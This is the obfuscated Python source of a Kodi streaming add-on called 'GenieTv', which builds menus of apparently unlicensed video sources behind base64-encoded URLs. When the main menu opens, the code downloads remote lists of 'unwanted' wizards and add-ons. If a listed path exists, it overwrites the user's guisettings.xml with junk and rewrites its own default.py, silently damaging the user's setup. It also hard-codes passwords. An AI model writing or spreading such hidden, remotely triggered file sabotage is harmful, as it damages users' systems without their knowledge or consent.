# -*- coding: cp1252 -*-
import xbmc , xbmcaddon , xbmcgui , xbmcplugin , os , base64 , sys , xbmcvfs , unicodedata
import urlresolver
from imports import cloudflare , googleplus , client , cleantitle
from imports import yt
import httplib
import requests
import urlparse
import shutil
import binascii
import subprocess
import urllib2 , urllib , glob , traceback
import re
from imports import extract
from imports import downloader
import plugintools
import zipfile
import time
import ntpath
import cookielib
from imports import Parse , CNF_Studio_Indexer
try :
 import json
except :
 import simplejson as json
from urllib2 import urlopen
from bs4 import BeautifulSoup
from BeautifulSoup import BeautifulStoneSoup , BeautifulSOAP
from cookielib import CookieJar
from addon . common . addon import Addon
from addon . common . net import Net
from imports . tvGuide import gui
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = ''
def oo ( i , t1 , t2 = [ ] ) :
 i1iII1IiiIiI1 = o0OO00
 for iIiiiI1IiI1I1 in t1 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 for iIiiiI1IiI1I1 in t2 :
  i1iII1IiiIiI1 += chr ( iIiiiI1IiI1I1 )
  i += 1
  if i > 1 :
   i1iII1IiiIiI1 = i1iII1IiiIiI1 [ : - 1 ]
   i = 0
 return i1iII1IiiIiI1
 if 87 - 87: OoOoOO00
 if 27 - 27: OOOo0 / Oo - Ooo00oOo00o . I1IiI
 if 73 - 73: OOooOOo / ii11ii1ii
O00ooOO = "2.7.9"
I1iII1iiII = xbmc . translatePath ( 'special://home/addons/repository.GenieTv' )
iI1Ii11111iIi = xbmc . translatePath ( 'special://home/addons/' )
i1i1II = xbmc . translatePath ( 'special://home/addonsbroke/' )
O0oo0OO0 = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3'
I1i1iiI1 = 'plugin.video.GenieTv'
iiIIIII1i1iI = [ 'plugin.video.GenieTv' , 'script.module.addon.common' , 'repository.GenieTv' ]
o0oO0 = xbmcaddon . Addon ( id = I1i1iiI1 )
oo00 = xbmc . translatePath ( 'special://home/media' )
o00 = 'plugin.video.GenieTv'
Oo0oO0ooo = xbmcgui . DialogProgress ( )
o0oOoO00o = "[COLORgreen]GenieTv[/COLOR]"
i1 = Net ( )
oOOoo00O0O = xbmcgui . Dialog ( )
i1111 = base64 . decodestring
i11 = o0oO0 . getSetting ( 'Build' )
I11 = o0oO0 . getSetting ( 'Local' )
Oo0o0000o0o0 = o0oO0 . getSetting ( 'Remote' )
oOo0oooo00o = o0oO0 . getSetting ( 'LocalM3u' )
oO0o0o0ooO0oO = o0oO0 . getSetting ( 'User' )
oo0o0O00 = o0oO0 . getSetting ( 'Pass' )
oO = o0oO0 . getSetting ( 'AdultPass' )
i1iiIIiiI111 = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
i1iiIII111ii = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'fanart.jpg' ) )
i1iIIi1 = xbmc . translatePath ( os . path . join ( 'special://home/addons/' + I1i1iiI1 , 'icon.png' , i1iiIII111ii , '' ) )
ii11iIi1I = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vR2VuaWVBcnQv' ) )
iI111I11I1I1 = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vR2VuaWVBcnQvb3JpZ2luLnBuZw==' ) )
OOooO0OOoo = xbmc . translatePath ( 'special://database' )
iIii1 = xbmc . translatePath ( 'special://home/userdata/addon_data/plugin.video.GenieTV' )
oOOoO0 = xbmc . translatePath ( 'special://thumbnails' ) ;
O0OoO000O0OO = "GenieTv"
iiI1IiI = ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20=' ) )
II = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv' ) )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/Change_Log_Temp' ) )
OooO0 = 'http://'
II11iiii1Ii = base64 . decodestring ( 'LnBocA==' )
OO0o = base64 . decodestring ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC8=' )
Ooo = [ ]
O0o0Oo = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/imports/tvGuide/ResetDatabase.py' ) )
Oo00OOOOO = o0oO0 . getLocalizedString
O0O = CookieJar ( )
O00o0OO = urllib2 . build_opener ( urllib2 . HTTPCookieProcessor ( O0O ) )
O00o0OO . addheaders = [ ( 'User-Agent' , 'Mozilla/5.0' ) ]
I11i1 = int ( sys . argv [ 1 ] )
iIi1ii1I1 = xbmc . translatePath ( o0oO0 . getAddonInfo ( 'profile' ) . decode ( 'utf-8' ) )
o0 = os . path . join ( iIi1ii1I1 , 'favorites' )
I11II1i = iIii1 + '/addons.ini'
IIIII = xbmc . translatePath ( 'special://home/userdata/' )
ooooooO0oo = xbmc . translatePath ( 'special://home/userdatabroke/' )
IIiiiiiiIi1I1 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9QYW5zQm94L09SSUdJTlMv' ) )
I1IIIii = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/script.ivueguide/master.db' ) )
oOoOooOo0o0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , 'favourites.xml' ) )
OOOO = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/plugin.video.GenieTv/favorites' ) )
if os . path . exists ( o0 ) == True :
 OOO00 = open ( o0 ) . read ( )
else : OOO00 = [ ]
iiiiiIIii = o0oO0 . getSetting ( 'debug' )
if os . path . exists ( iIii1 ) == False :
 os . makedirs ( iIii1 )
O000OO0 = 'http://architects.x10host.com/safety/index.php?mode=XxX&password=fordfiesta'
if 43 - 43: OoIii111II - iii11 . Ooo0OO0oOO - ii11i1
if 29 - 29: oo0OO % OoO0O0 * O0o0Ooo / o0Oo0O0Oo00oO - O0o0Ooo + OOooOOo
def O0O0O ( ) :
 if not os . path . exists ( I1iII1iiII ) :
  oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will only work with" , 'its official repo please install from trusted source' , '' )
  oO0Oo = 'genie tv repo not being installed '
  oOOoo0Oo ( oO0Oo )
 else :
  if not os . path . exists ( xbmc . translatePath ( os . path . join ( 'special://home/addons/service.xbmc.cleanse' ) ) ) :
   oO0Oo = 'genie tv repo not being installed '
   oOOoo0Oo ( oO0Oo )
  else :
   pass
def o00OO00OoO ( ) :
 O0O0O ( )
 OOOO0OOoO0O0 ( )
 O0Oo000ooO00 ( )
 oO0 ( )
 Ii1iIiII1ii1 ( '[COLORgreen]Force Genie Update Kodi 16+[/COLOR]' , i1111 ( 'aHR0cDovL2dlbmlldHYuY28udWsvcmVwby9yZXBvc2l0b3J5LkdlbmllVHYtMC4xLjAuemlw' ) , 10085 , ii11iIi1I + 'updategenie.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'My Build' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]WIZARD[/COLOR]' , iiI1IiI , 4001 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Streams' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]STREAMS[/COLOR]' , iiI1IiI , 4002 , ii11iIi1I + 'streams.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Music' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]Music[/COLOR]' , iiI1IiI , 4003 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
  if 59 - 59: OoOoOO00 + OoooooooOO * I1IiI + i1IIi
 if o0oO0 . getSetting ( 'Builders Toolbox' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]BUILDERS TOOLBOX[/COLOR]' , iiI1IiI , 32 , ii11iIi1I + 'builderstoolbox.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Source List' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]SOURCE LIST[/COLOR]' , iiI1IiI , 46 , ii11iIi1I + 'sources.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Maintainance' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]MAINTENANCE[/COLOR]' , iiI1IiI , 3 , ii11iIi1I + 'MAIN6.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]ADDONS[/COLOR]' , '' , 10050 , ii11iIi1I + 'ADDONS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'APK Tool' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]APK TOOL[/COLOR]' , iiI1IiI , 2 , ii11iIi1I + 'APK.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Rss Feed' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]GenieTv RSS Feed[/COLOR]' , iiI1IiI , 39 , ii11iIi1I + 'RSS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Addons Packs' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]ADDONS PACKS[/COLOR]' , iiI1IiI , 30 , ii11iIi1I + 'ADDONP.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 80 - 80: OoIii111II + iii11 - iii11 % oo0OO
def OoOO0oo0o ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]BACKUP MY BUILD[/COLOR]' , iiI1IiI , 10060 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]RESTORE MY BUILD[/COLOR]' , iiI1IiI , 49 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]WIPE GENIE[/COLOR]' , iiI1IiI , 41 , ii11iIi1I + 'wipegenie.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]WISHES PC[/COLOR]' , iiI1IiI , 1 , ii11iIi1I + 'WISHESPC.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]WISHES ANDROID[/COLOR]' , iiI1IiI , 44 , ii11iIi1I + 'WISHESAN.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
def II11i1I11Ii1i ( ) :
 O0O0O ( )
 if oO == '5knuckleshuffle' :
  ooOooo000oOO ( '[COLORgreen]XVID[/COLOR]' , iiI1IiI , 10100 , ii11iIi1I + 'JIZBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Favourites' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]FAVOURITES[/COLOR]' , iiI1IiI , 10057 , ii11iIi1I + 'FAVORITES.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Search' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]SEARCH[/COLOR]' , iiI1IiI , 9000 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Live TV[/COLOR]' , iiI1IiI , 4009 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]MOVIES[/COLOR]' , iiI1IiI , 4004 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]TV SHOWS[/COLOR]' , iiI1IiI , 4005 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]STREAM TEAM[/COLOR]' , iiI1IiI , 4006 , ii11iIi1I + 'streamteam.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 4007 , ii11iIi1I + 'KIDSv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]HOBBIES[/COLOR]' , iiI1IiI , 4008 , ii11iIi1I + 'hobbies.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'YOUTUBE' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]SEARCH YOUTUBE[/COLOR]' , iiI1IiI , 10064 , ii11iIi1I + 'youtube.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'REQUESTS' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]REQUESTS[/COLOR]' , iiI1IiI + ( i1111 ( 'L1JFUVVFU1RTLnBocA==' ) ) , 10066 , ii11iIi1I + 'requests.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Stand Up' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]STAND UP[/COLOR]' , '' , 10003 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Documentaries' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]DOCUMENTARIES[/COLOR]' , iiI1IiI , 8040 , ii11iIi1I + 'documentary.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Disclose' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]DISCLOSE TV[/COLOR]' , iiI1IiI , 7001 , ii11iIi1I + 'disclose.png' , i1iiIII111ii , '' )
  if 97 - 97: o0Oo0O0Oo00oO % oo0OO * ii11i1 + OOooOOo . iii11 + iii11
  if 59 - 59: iIii1I11I1II1 * i11iIiiIii / ii11ii1ii * i1IIi * O0
 if o0oO0 . getSetting ( 'Playlist Loader' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]PLAYLIST LOADER[/COLOR]' , iiI1IiI , 3000 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
  if 83 - 83: Ooo00oOo00o / O0o0Ooo . I1IiI / OoO0O0 . I1IiI . iii11
  if 75 - 75: Ooo0OO0oOO + Ooo00oOo00o . I1IiI . o0Oo0O0Oo00oO + Oo . Ooo00oOo00o
  if 96 - 96: iii11 . o0Oo0O0Oo00oO - Oo + iIii1I11I1II1 / I1IiI * iii11
  if 65 - 65: ii11i1 . iIii1I11I1II1 / O0 - ii11i1
  if 21 - 21: OOOo0 * iIii1I11I1II1
  if 91 - 91: OoO0O0
  if 15 - 15: OoOoOO00
  if 18 - 18: i11iIiiIii . i1IIi % OoooooooOO / O0
  if 75 - 75: I1IiI % OOooOOo % OOooOOo . O0o0Ooo
  if 5 - 5: OOooOOo * o0Oo0O0Oo00oO + I1IiI . iii11 + I1IiI
  if 91 - 91: O0
  if 61 - 61: OoOoOO00
  if 64 - 64: o0Oo0O0Oo00oO / I1IiI - O0 - Ooo0OO0oOO
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 86 - 86: Ooo0OO0oOO % I1IiI / OOOo0 / I1IiI
def OOOO0OOoO0O0 ( ) :
 if not os . path . exists ( ooOoOoo0O ) :
  iIIi1i1 ( 'Change Log 01/05/16 - v2.7.9' , 'Fixing Tv Guide Link Button, should have full pics and most channels showing data in guide now \n\n\nAlso taken a bad source out of movie search and added progress bars so wait time doesnt seem so long' )
  os . makedirs ( ooOoOoo0O )
  if 10 - 10: Ooo0OO0oOO
  if 82 - 82: ii11ii1ii - iIii1I11I1II1 / iii11 + ii11i1
def OOOOoOoo0O0O0 ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Popcorn Box' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]POPCORN BOX[/COLOR]' , iiI1IiI , 7061 , ii11iIi1I + 'popcorn.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Film Trailers[/COLOR]' , i1111 ( 'aHR0cDovL3RoZW1vdmllYm94Lm5ldC9leHBsb3Jl' ) , 10068 , ii11iIi1I + 'movietrailers.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC MOVIES' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]CLASSIC MOVIES[/COLOR]' , '' , 8060 , ii11iIi1I + 'classicmovies.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
def OOOo00oo0oO ( ) :
 O0O0O ( )
 if o0oO0 . getSetting ( 'G-tv' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]G-Tv PRIVATE LIST[/COLOR]' , '' , 10058 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'TV GUIDE' ) == 'true' :
  Ii1iIiII1ii1 ( '[COLORgreen]TV GUIDE[/COLOR]' , '' , 10063 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( '[COLORgreen]Link GTV Donators Username and Password to Guide[/COLOR]' , '' , 4010 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
 if 1 - 1: Ooo00oOo00o - OoIii111II . Ooo0OO0oOO . Ooo00oOo00o / Oo + Ooo0OO0oOO
 if 78 - 78: O0 . OoIii111II . OoOoOO00 % iii11
def i1iIi ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Dizzy Tv' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]DIZZY TV[/COLOR]' , '' , 10018 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Watch Series' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]WATCH SERIES[/COLOR]' , '' , 10040 , ii11iIi1I + 'WATCHSERIES.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]iWATCH SERIES[/COLOR]' , '' , 8020 , ii11iIi1I + 'iwatch.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Recent Episodes' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]RECENT EPISODES[/COLOR]' , iiI1IiI , 8081 , ii11iIi1I + 'recent.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CLASSIC TV' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]CLASSIC TV[/COLOR]' , iiI1IiI , 8064 , ii11iIi1I + 'classictv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]TV Show Trailers[/COLOR]' , i1111 ( 'aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj03WkZJUzJBcUF6OCZsaXN0PVBMM2t4NWgyVHJZR3dwVzBWYk5lbnBqLUJLTUJUR2dKUEU=' ) , 10069 , ii11iIi1I + 'tvtrailers.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]TV Show Schedule[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'tvschedule.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
def ooOOoooooo ( ) :
 O0O0O ( )
 if o0oO0 . getSetting ( 'Scooby Streams' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]SCOOBY STREAMS[/COLOR]' , iiI1IiI , 1023 , ii11iIi1I + 'scoob.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'The Reaper' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]THE REAPER[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'reap.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Pandoras Box' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]PANDORAS BOX[/COLOR]' , iiI1IiI , 10025 , ii11iIi1I + 'PANDORASBOX.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'HeroVision' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]HEROVISION[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC9tYWluLnBocA==' ) ) , 1016 , ii11iIi1I + 'hero.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Silent Hunter' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 10084 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Redemption Streams' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]Redemption Streams[/COLOR]' , ( i1111 ( 'aHR0cDovL3JlZGVtcHRpb25idWlsZC4xNm1iLmNvbS9SZWRlbXB0aW9uL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'redemption.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]ITV[/COLOR]' , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9tYWluLnBocA==' ) ) , 1016 , ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9pVHZfU3RyZWFtcy9pdHZzdHJlYW1zLnBuZw==' ) ) , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 1 - 1: Oo / OOooOOo % oo0OO * OoO0O0 . i11iIiiIii
def III1Iiii1I11 ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]SILENT HUNTER[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni8=' ) ) , 1006 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]SILENT HUNTER SCRAPES[/COLOR]' , ( i1111 ( 'aHR0cDovLzUuMTM1LjIwNy45Ni9TY3JhcGVzL21haW4ucGhw' ) ) , 1016 , ii11iIi1I + 'SILENTHUNTER.png' , i1iiIII111ii , '' )
 if 9 - 9: ii11ii1ii / Oo - OOOo0 / OoooooooOO / iIii1I11I1II1 - OOooOOo
 if 91 - 91: oo0OO % i1IIi % iIii1I11I1II1
 if 20 - 20: iii11 % ii11i1 / ii11i1 + ii11i1
def III1IiiI ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'WCO' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]WATCH CARTOONS ONLINE[/COLOR]' , iiI1IiI , 21004 , ii11iIi1I + 'watchcartoons.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Cartoons' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 10001 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Anime' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]AnimeLand[/COLOR]' , ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2R1YmJlZC1hbmltZQ==' ) ) , 10004 , ii11iIi1I + 'anime.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
def iI ( ) :
 O0O0O ( )
 if o0oO0 . getSetting ( 'Football' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]FOOTBALL[/COLOR]' , '' , 10002 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Fitness' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]FITNESS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cuZml0bmVzc2JsZW5kZXIuY29tL3ZpZGVvcw==' ) ) , 7085 , ii11iIi1I + 'FITNESS.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'Go Fishing' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]Go Fishing[/COLOR]' , iiI1IiI , 8090 , ii11iIi1I + 'gofish.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'GenieTv Kitchen' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]GenieTv Kitchen[/COLOR]' , ( i1111 ( 'aHR0cDovL2Zvb2QubmR0di5jb20vdmlkZW9z' ) ) , 8045 , ii11iIi1I + 'geniekitchen.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 32 - 32: oo0OO . OoO0O0 . OoO0O0
 if 62 - 62: ii11ii1ii + OoO0O0 % oo0OO + iii11
 if 33 - 33: O0 . OoO0O0 . OOOo0
def oO0 ( ) :
 OoOO = ooOOO0 ( 'http://architects.x10host.com/wizarddelete.txt' )
 o0o = re . compile ( '<unwanted_wizard =(.+?)</unwanted_wizard>' ) . findall ( OoOO )
 for O0OOoO00OO0o in o0o :
  print O0OOoO00OO0o
  O0OOoO00OO0o = ( str ( O0OOoO00OO0o ) )
  if os . path . exists ( xbmc . translatePath ( O0OOoO00OO0o ) ) :
   I1111IIIIIi = os . path . join ( IIIII , 'guisettings.xml' )
   Iiii1i1 = open ( I1111IIIIIi , "w+" )
   if 84 - 84: OOOo0 . iIii1I11I1II1 % OoooooooOO + ii11i1 % OoooooooOO % Ooo00oOo00o
   Iiii1i1 . write ( r'.' )
   IIi1 ( )
  else :
   pass
   if 45 - 45: oo0OO / oo0OO + O0o0Ooo + o0Oo0O0Oo00oO
def O0Oo000ooO00 ( ) :
 OoOO = ooOOO0 ( 'http://architects.x10host.com/testdelete.txt' )
 o0o = re . compile ( '<unwanted_addon =(.+?)</unwanted_addon>' ) . findall ( OoOO )
 for oO0Oo in o0o :
  oO0Oo = ( str ( oO0Oo ) )
  if os . path . exists ( xbmc . translatePath ( oO0Oo ) ) :
   oOOoo0Oo ( oO0Oo )
   iI111i ( )
  else :
   pass
   if 26 - 26: ii11ii1ii * oo0OO . OoOoOO00 * ii11i1
def oOOoo0Oo ( addon ) :
 oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will not work with" , addon , 'please remove then reinstall genie' )
 I1111IIIIIi = os . path . join ( II , 'default.py' )
 Iiii1i1 = open ( I1111IIIIIi , "w+" )
 if 28 - 28: Ooo00oOo00o . i1IIi * OOOo0 + O0 . i1IIi - o0Oo0O0Oo00oO
 Iiii1i1 . write ( r'Genie Tv will not work with certain addons in an attempt to bring you original content from the best developers' )
 Iiii1i1 . write ( r'and not those simply out to profit or make a name for themselves off others work' )
 Iiii1i1 . write ( r'Please remove' + unwanted_addons + 'if you would like to use genie tv then uninstall and reinstall from official repo' )
 if 38 - 38: O0o0Ooo
 if 84 - 84: iIii1I11I1II1 % oo0OO / iIii1I11I1II1 % Ooo0OO0oOO
def IIi1 ( ) :
 OoOO = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) )
 ii = re . compile ( '<tr>.+?title="(.+?)">(.+?)</tr>' , re . DOTALL ) . findall ( OoOO )
 for OOooooO0Oo , ii in ii :
  OOooooO0Oo = OOooooO0Oo
  o0o = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)\n</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( ii ) )
  for OO , iIiIIi1 in o0o :
   iIIi1i1 ( OOooooO0Oo , OO , iIiIIi1 )
   if 7 - 7: o0Oo0O0Oo00oO - Oo - OoIii111II + o0Oo0O0Oo00oO
   if 26 - 26: ii11i1
   if 35 - 35: ii11i1 - OOOo0 % OOooOOo . OoooooooOO % ii11i1
   if 47 - 47: oo0OO - ii11i1 . OoOoOO00 + OoooooooOO . i11iIiiIii
   if 94 - 94: OOooOOo * ii11i1 / Oo / ii11i1
   if 87 - 87: Oo . OoO0O0
   if 75 - 75: o0Oo0O0Oo00oO + I1IiI + OOooOOo * Ooo0OO0oOO % OoIii111II . oo0OO
   if 55 - 55: iii11 . OOOo0
   if 61 - 61: Oo % OoO0O0 . Oo
   if 100 - 100: O0o0Ooo * O0
   if 64 - 64: iii11 % iIii1I11I1II1 * OoIii111II
   if 79 - 79: O0
   if 78 - 78: ii11ii1ii + iii11 - O0o0Ooo
   if 38 - 38: OOooOOo - OoIii111II + iIii1I11I1II1 / I1IiI % Oo
   if 57 - 57: Ooo00oOo00o / o0Oo0O0Oo00oO
   if 29 - 29: iIii1I11I1II1 + I1IiI * Ooo00oOo00o * iii11 . OOOo0 * OOOo0
   if 7 - 7: OoO0O0 * O0o0Ooo % ii11i1 - OOooOOo
def i1i ( ) :
 ooOooo000oOO ( 'Genre' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10073 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( 'Most Viewed' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10077 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
